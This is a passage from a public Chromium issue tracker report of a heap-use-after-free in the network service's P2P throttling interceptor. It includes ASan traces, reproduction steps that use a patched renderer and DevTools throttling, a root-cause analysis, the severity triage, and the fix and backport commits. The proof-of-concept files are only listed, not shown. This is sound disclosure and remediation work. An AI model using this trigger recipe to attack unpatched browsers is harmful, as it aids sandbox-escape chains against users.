    #12 0x7fab48aa6f0f in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>) mojo/public/cpp/bindings/lib/connector.cc:568:49
    #13 0x7fab48aa875e in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:629:14
    #14 0x7fab48aa81f7 in mojo::Connector::OnWatcherHandleReady(char const*, unsigned int) mojo/public/cpp/bindings/lib/connector.cc:454:3
    #15 0x7fab48aaade1 in base::internal::Invoker<...>::Run(base::internal::BindStateBase*, unsigned int) base/functional/bind_internal.h:740:12
    #16 0x7fab48aaa48e in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const & base/functional/callback.h:343:12
    #17 0x7fab48aaa244 in base::internal::Invoker<...>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&) base/functional/bind_internal.h:673:12
    #18 0x7fab481a5490 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(...) const & base/functional/callback.h:343:12
    #19 0x7fab481a4e6b in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) mojo/public/cpp/system/simple_watcher.cc:286:14
    #20 0x7fab481a5808 in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int) mojo/public/cpp/system/simple_watcher.cc:97:22
    #21 0x7fab481a257f in mojo::SimpleWatcher::Context::CallNotify(MojoTrapEvent const*) mojo/public/cpp/system/simple_watcher.cc:61:14
    #22 0x7fab47d1d54b in mojo::core::ipcz_driver::MojoTrap::DispatchOrQueueEvent(...) mojo/core/ipcz_driver/mojo_trap.cc:605:3
    #23 0x7fab47d1f7ca in mojo::core::ipcz_driver::MojoTrap::HandleEvent(IpczTrapEvent const&) mojo/core/ipcz_driver/mojo_trap.cc:459:3
    #24 0x7fab47dea9d2 in ipcz::TrapEventDispatcher::~TrapEventDispatcher() third_party/ipcz/src/ipcz/trap_event_dispatcher.cc:30:5
    #25 0x7fab47dd0fff in ipcz::Router::AcceptInboundParcel(...) third_party/ipcz/src/ipcz/router.cc:272:1
    #26 0x7fab47d99697 in ipcz::NodeLink::AcceptCompleteParcel(...) third_party/ipcz/src/ipcz/node_link.cc:1082:31
    #27 0x7fab47d9e323 in ipcz::NodeLink::OnAcceptParcel(ipcz::msg::AcceptParcel&) third_party/ipcz/src/ipcz/node_link.cc:666:10
    #28 0x7fab47dbff61 in ipcz::msg::NodeMessageListener::OnTransportMessage(...) third_party/ipcz/src/ipcz/node_messages.cc:746:16
    #29 0x7fab47d641f6 in ipcz::(anonymous namespace)::NotifyTransport(...) third_party/ipcz/src/ipcz/driver_transport.cc:129:20

Thread T5 (Chrome_ChildIOT) created by T0 (chrome) here:
    #0 0x56500a167ef1 in pthread_create
    #1 0x7fab476dddbc in base::(anonymous namespace)::CreateThread(...) base/threading/platform_thread_posix.cc:153:13
    #2 0x7fab47678c20 in base::Thread::StartWithOptions(base::Thread::Options) base/threading/thread.cc:228:26
    #3 0x7fab388b9123 in content::ChildProcess::ChildProcess(...) content/child/child_process.cc:152:21
    #4 0x7fab3d50c50c in content::UtilityMain(content::MainFunctionParams) content/utility/utility_main.cc:459:16
    #5 0x7fab3d64c1cd in content::RunOtherNamedProcessTypeMain(...) content/app/content_main_runner_impl.cc:762:14
    #6 0x7fab3d64e8ea in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1152:10
    #7 0x7fab3d649043 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:358:36
    #8 0x7fab3d6493ca in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:371:10
    #9 0x56500a1bfa35 in ChromeMain chrome/app/chrome_main.cc:191:12
    #10 0x7faad6e29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-use-after-free gen/third_party/libc++/src/include/__tree:208:12 in network::ThrottlingP2PNetworkInterceptor::OnSendNetworkTimer()
MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.
Shadow bytes around the buggy address:
  0x7cbac9079200: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd
  0x7cbac9079280: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7cbac9079300: fd fd fd fd fd fd fd fa fa fa fa fa fa fa f7 fa
  0x7cbac9079380: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7cbac9079400: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa
=>0x7cbac9079480: fa fa fa fa fa fa f7 fa fd[fd]fd fd fd fd fd fd
  0x7cbac9079500: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7cbac9079580: fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7cbac9079600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7cbac9079680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7cbac9079700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Stack buffer overflow:   f4
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3434823==ABORTING

```
## Credit

c6eed09fc8b174b0f3eebedcceb1e792

## Attachments

- [README.md](attachments/README.md) (text/markdown, 832 B)
- [poc.html](attachments/poc.html) (text/html, 545 B)
- [renderer_patch.diff](attachments/renderer_patch.diff) (text/x-diff, 4.7 KB)
- [asan_log.txt](attachments/asan_log.txt) (text/plain, 23.6 KB)
- [poc_trigger.py](attachments/poc_trigger.py) (text/x-python, 8.5 KB)
- [poc.html](attachments/poc_73801337.html) (text/html, 545 B)
- [poc-p2p-interceptor.log](attachments/poc-p2p-interceptor.log) (text/plain, 11.0 MB)
- [poc_trigger.py](attachments/poc_trigger_73801896.py) (text/x-python, 8.5 KB)
- [renderer.diff](attachments/renderer.diff) (text/x-diff, 4.7 KB)
- [asan_manual_devtools_report.txt](attachments/asan_manual_devtools_report.txt) (text/plain, 30.2 KB)

## Timeline

### aj...@google.com (2026-02-26)

Hello please attach files as files to reports so we can easily view, download and reproduce reported issues.

Secondly, please attach (again, as a file) the complete asan trace including the complete additional information section.

### je...@gmail.com (2026-02-26)

Sure, I will do it this. This report was written in a bit of a hurry. Thank you for the reminder.

### pe...@google.com (2026-02-26)

Thank you for providing more feedback. Adding the requester to the CC list.

### je...@gmail.com (2026-02-26)

Note to modify the hardcoded location in poc\_trigger.py

CHROME = os.path.expanduser("~/chromium/src/out/asan-release/chrome")

### aj...@google.com (2026-02-26)

I can't get renderer\_patch.diff to apply at HEAD (0438c58fa088a) but I've fiddled it.

With the modified attached files I get the following:

```
cat 
...
=================================================================
==1331975==ERROR: AddressSanitizer: heap-use-after-free on address 0x7c82985da748 at pc 0x55dc8fa3d6b4 bp 0x7b728db92000 sp 0x7b728db91ff8
READ of size 8 at 0x7c82985da748 thread T5 (Chrome_ChildIOT)
==1331975==WARNING: invalid path to external symbolizer!
==1331975==WARNING: Failed to use and restart external symbolizer!
    #0 0x55dc8fa3d6b3  (/usr/local/google/home/ajgo/src/chromium/src/out/Asan/chrome+0x3d77e6b3) (BuildId: c3906cb5b613d06e)
    #1 0x55dc8fa3aa25  (/usr/local/google/home/ajgo/src/chromium/src/out/Asan/chrome+0x3d77ba25) (BuildId: c3906cb5b613d06e)
...
MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==1331975==END OF ADDITIONAL INFO
...

```

### aj...@google.com (2026-02-26)

Likely introduced in <https://chromium-review.googlesource.com/c/chromium/src/+/5268668>

Setting Sev=Medium as this UAF in the moderately privileged network service requires a renderer compromise and winning a race.

### aj...@google.com (2026-02-26)

This may be an interaction with the CDP provided throttling service only, if so this might not be a security issue.

### aj...@google.com (2026-02-26)

OS based on is\_p2p\_enabled=is\_blink

### mm...@chromium.org (2026-02-27)

A bit surprised this code doesn't have its own owners file. Is it owned by the p2p folks? By the devtools team?

### je...@gmail.com (2026-02-27)

re #c8: This vulnerability is unrelated to CDP. Below are the standard reproduction steps and ASAN log:

## Reproduction without CDP script (manual DevTools throttling)

This confirms the vulnerability is not CDP-specific. The same heap-use-after-free is triggered when network throttling is enabled manually through the DevTools Network panel UI, without any CDP automation.

### Steps to reproduce

1. Apply the renderer patch (`renderer_patch.diff`) and build an ASAN-instrumented Chrome:

```
autoninja -C out/asan-release chrome

```

2. Serve `poc.html` via a local HTTP server:

```
cd /path/to/poc/directory
python3 -m http.server 8877

```

3. Launch the ASAN Chrome (no `--remote-debugging-port` needed, no CDP script involved):

```
ASAN_OPTIONS=detect_odr_violation=0 \
  out/asan-release/chrome \
  --disable-gpu \
  --user-data-dir=$(mktemp -d) \
  --enable-logging=stderr \
  --v=1 \
  about:blank \
  2>/tmp/poc-p2p-manual.log

```

(On macOS replace `out/asan-release/chrome` with the Chromium.app path)

4. In the launched Chrome window, press F12 (or Cmd+Option+I on macOS) to open DevTools.
5. Switch to the Network panel.
6. Click the throttling dropdown (shows "No throttling") and select "3G" (or any throttling preset — "Slow 4G", "Fast 4G" all work).
7. Navigate to `http://127.0.0.1:8877/poc.html` in the address bar.
8. Wait approximately 5 seconds. The patched renderer creates P2P sockets via Mojo 3 seconds after page load. When the interceptor timer fires, the heap-use-after-free occurs.
9. Verify the crash:

```
grep -E "AddressSanitizer|heap-use-after-free|SUMMARY|MiraclePtr" /tmp/poc-p2p-manual.log

```
### Result

```
==54310==ERROR: AddressSanitizer: heap-use-after-free on address 0x6110002a4448
READ of size 8 at 0x6110002a4448 thread T7

```

The crash stack trace is identical to the CDP-triggered reproduction:

```
USE: OnSendNetworkTimer() → std::map::erase(invalidated_iterator)
FREE: OnSendNetworkTimer() → SendFromInterceptor() → DoSend() → OnError()
        → DestroySocket() → ~P2PSocketUdp() → UnregisterSocket() → std::erase_if()

```

The browser process logs confirm:

```
Network service crashed or was terminated, restarting service.

```

MiraclePtr status:

```
MiraclePtr Status: NOT PROTECTED
This crash is still exploitable with MiraclePtr.

```
### Why this is not CDP-specific

The DevTools UI "3G" dropdown internally sends the same `Network.emulateNetworkConditions` CDP command to the backend. The code path is identical:

```
DevTools UI (3G dropdown)
  → CDP Network.emulateNetworkConditions
    → NetworkHandler::EmulateNetworkConditions
      → ThrottlingController::SetConditions
        → ThrottlingP2PNetworkInterceptor::UpdateConditions

```

The vulnerability is in `ThrottlingP2PNetworkInterceptor::OnSendNetworkTimer()` itself — the iterator invalidation caused by reentrant socket destruction — not in how throttling is activated. Any method of enabling throttling (DevTools UI, CDP script, Puppeteer, Playwright) triggers the same bug.

### Real-world attack scenario

A victim (web developer or QA engineer) only needs to:

1. Have DevTools open with any network throttling preset selected (routine during web development)
2. Navigate to an attacker-controlled page

The attacker does not need to control or influence the throttling configuration. The compromised renderer exploits the bug via direct Mojo IPC to the Network Service, completely bypassing WebRTC JavaScript APIs.

### je...@gmail.com (2026-02-27)

re #c7: I agree that this UAF is in a moderately privileged network service and requires a renderer compromise. However, I want to point out that this is not a race condition. 
The entire use-after-free chain executes synchronously on the same thread (T7 in the ASAN report) via reentrant function calls. The trigger is 100% deterministic — no timingwindow needs to be won.

### aj...@google.com (2026-02-27)

Thanks for the extra information - setting Sev=High (S1).

### aj...@google.com (2026-02-27)

I believe the original author is no longer at Google so finding someone else from the DD linked in the introducing CL - please take a look or suggest a useful owner.

### ch...@google.com (2026-02-27)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-27)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must exceed severity.

### ch...@google.com (2026-03-14)

guidou: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.[internal debugging info: security\_nag\_check]

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### ch...@google.com (2026-04-27)

We commit ourselves to a 60 day deadline for fixing for s1 severity vulnerabilities, and have exceeded it here. If you're unable to look into this soon, could you please find another owner or remove yourself so that this gets back into the security triage queue?

### dx...@google.com (2026-05-08)

Project: chromium/src  

Branch:  main  

Author:  Guido Urdaneta [guidou@chromium.org](mailto:guidou@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7816842>

Fix reentrancy issue in ThrottlingP2PNetworkInterceptor

---


Expand for full commit details
```
     
    Do not rely on an iterator that can be synchronously invalidated to 
    access pending packets in 
    ThrottlingP2PNetworkInterceptor::OnSendNetworkTimer(). Move the pending 
    packet out of the iterator before sending it. 
     
    Use the same pattern on the receive side for consistency, although it is 
    not subject to synchronous invalidation. 
     
    Fixed: 487357841 
    Change-Id: I461b33f01bf2047bea3d1007264b48d494685c14 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7816842 
    Commit-Queue: Guido Urdaneta <guidou@chromium.org> 
    Reviewed-by: Adam Rice <ricea@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1627931}

```

---

Files:

- M `services/network/p2p/socket_udp_unittest.cc`
- M `services/network/throttling/throttling_p2p_network_interceptor.cc`

---

Hash: [75d23c4ce5bd12e21f9a4693b9a4dd6de8b55d9e](https://chromiumdash.appspot.com/commit/75d23c4ce5bd12e21f9a4693b9a4dd6de8b55d9e)  

Date: Fri May 8 21:46:00 2026


---

### sp...@google.com (2026-05-19)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
Baseline with bisect. Moderately mitigated (sandboxed). This bug also required a compromised renderer.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-05-20)

Requesting merge to M148 because latest trunk commit is in 150.

Security Merge Request:

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Requesting merge to M149 because latest trunk commit is in 150.

### ch...@google.com (2026-05-20)

**M148** merge request created. **Please update [crbug/514926711](https://crbug.com/514926711) to have this merge reviewed.**

### ch...@google.com (2026-05-20)

**M149** merge request created. **Please update [crbug/514929419](https://crbug.com/514929419) to have this merge reviewed.**

### dx...@google.com (2026-05-22)

Project: chromium/src  

Branch:  refs/branch-heads/7827  

Author:  Guido Urdaneta [guidou@chromium.org](mailto:guidou@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7869901>

[M149] Fix reentrancy issue in ThrottlingP2PNetworkInterceptor

---


Expand for full commit details
```
     
    Original change's description: 
    > Fix reentrancy issue in ThrottlingP2PNetworkInterceptor 
    > 
    > Do not rely on an iterator that can be synchronously invalidated to 
    > access pending packets in 
    > ThrottlingP2PNetworkInterceptor::OnSendNetworkTimer(). Move the pending 
    > packet out of the iterator before sending it. 
    > 
    > Use the same pattern on the receive side for consistency, although it is 
    > not subject to synchronous invalidation. 
    > 
    > Fixed: 487357841 
    > Change-Id: I461b33f01bf2047bea3d1007264b48d494685c14 
    > Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7816842 
    > Commit-Queue: Guido Urdaneta <guidou@chromium.org> 
    > Reviewed-by: Adam Rice <ricea@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#1627931} 
     
    (cherry picked from commit 75d23c4ce5bd12e21f9a4693b9a4dd6de8b55d9e) 
     
    Bug: 514929419,487357841 
    Change-Id: I461b33f01bf2047bea3d1007264b48d494685c14 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7869901 
    Commit-Queue: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Bot-Commit: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/7827@{#1515} 
    Cr-Branched-From: 9f3e9aaccba63bd2ec30334e45e0bfd07ebcc8f1-refs/heads/main@{#1625079}

```

---

Files:

- M `services/network/p2p/socket_udp_unittest.cc`
- M `services/network/throttling/throttling_p2p_network_interceptor.cc`

---

Hash: [cda9c37c28da9c3190add8720608e6b0f8d1884c](https://chromiumdash.appspot.com/commit/cda9c37c28da9c3190add8720608e6b0f8d1884c)  

Date: Fri May 22 20:09:37 2026


---

### pe...@google.com (2026-05-22)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### dx...@google.com (2026-05-29)

Project: chromium/src  

Branch:  refs/branch-heads/7778  

Author:  Guido Urdaneta [guidou@chromium.org](mailto:guidou@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7869453>

[M148] Fix reentrancy issue in ThrottlingP2PNetworkInterceptor

---


Expand for full commit details
```
     
    Original change's description: 
    > Fix reentrancy issue in ThrottlingP2PNetworkInterceptor 
    > 
    > Do not rely on an iterator that can be synchronously invalidated to 
    > access pending packets in 
    > ThrottlingP2PNetworkInterceptor::OnSendNetworkTimer(). Move the pending 
    > packet out of the iterator before sending it. 
    > 
    > Use the same pattern on the receive side for consistency, although it is 
    > not subject to synchronous invalidation. 
    > 
    > Fixed: 487357841 
    > Change-Id: I461b33f01bf2047bea3d1007264b48d494685c14 
    > Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7816842 
    > Commit-Queue: Guido Urdaneta <guidou@chromium.org> 
    > Reviewed-by: Adam Rice <ricea@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#1627931} 
     
    (cherry picked from commit 75d23c4ce5bd12e21f9a4693b9a4dd6de8b55d9e) 
     
    Bug: 514926711,487357841 
    Change-Id: I461b33f01bf2047bea3d1007264b48d494685c14 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7869453 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Bot-Commit: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Commit-Queue: Guido Urdaneta <guidou@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7778@{#3958} 
    Cr-Branched-From: 77f495ee216d4c3cc784d33658bad4778c0680ee-refs/heads/main@{#1610480}

```

---

Files:

- M `services/network/p2p/socket_udp_unittest.cc`
- M `services/network/throttling/throttling_p2p_network_interceptor.cc`

---

Hash: [ae0292784ba74bc4a5592c8d09f415928891b9f2](https://chromiumdash.appspot.com/commit/ae0292784ba74bc4a5592c8d09f415928891b9f2)  

Date: Fri May 29 09:35:12 2026


---

### pe...@google.com (2026-06-10)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### vi...@google.com (2026-06-10)

1. <https://chromium-review.git.corp.google.com/c/chromium/src/+/7914124>
2. Low. There were no conflicts.
3. 148 and 149
4. Yes

### dx...@google.com (2026-06-15)

Project: chromium/src  

Branch:  refs/branch-heads/7559  

Author:  Tiago Vignatti [vignatti@google.com](mailto:vignatti@google.com)  

Link:    <https://chromium-review.googlesource.com/7914124>

[M144-LTS] Fix reentrancy issue in ThrottlingP2PNetworkInterceptor

---


Expand for full commit details
```
[M144-LTS] Fix reentrancy issue in ThrottlingP2PNetworkInterceptor

Do not rely on an iterator that can be synchronously invalidated to
access pending packets in
ThrottlingP2PNetworkInterceptor::OnSendNetworkTimer(). Move the pending
packet out of the iterator before sending it.

Use the same pattern on the receive side for consistency, although it is
not subject to synchronous invalidation.

(cherry picked from commit 75d23c4ce5bd12e21f9a4693b9a4dd6de8b55d9e)

Fixed: 487357841
Change-Id: I461b33f01bf2047bea3d1007264b48d494685c14
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7816842
Commit-Queue: Guido Urdaneta <guidou@chromium.org>
Reviewed-by: Adam Rice <ricea@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1627931}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7914124
Reviewed-by: Mohamed Omar <mohamedaomar@google.com>
Owners-Override: Mohamed Omar <mohamedaomar@google.com>
Reviewed-by: Guido Urdaneta <guidou@chromium.org>
Commit-Queue: Tiago Vignatti (xWF) <vignatti@google.com>
Cr-Commit-Position: refs/branch-heads/7559@{#5022}
Cr-Branched-From: 223dfbac1c7542a06b422390d954afe5b560b607-refs/heads/main@{#1552494}

```

---

Files:

- M `services/network/p2p/socket_udp_unittest.cc`
- M `services/network/throttling/throttling_p2p_network_interceptor.cc`

---

Hash: [feef0957b00c500bde8647de73591017e986db6f](https://chromiumdash.appspot.com/commit/feef0957b00c500bde8647de73591017e986db6f)  

Date: Mon Jun 15 18:18:46 2026


---

### ch...@google.com (2026-08-15)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/487357841)*
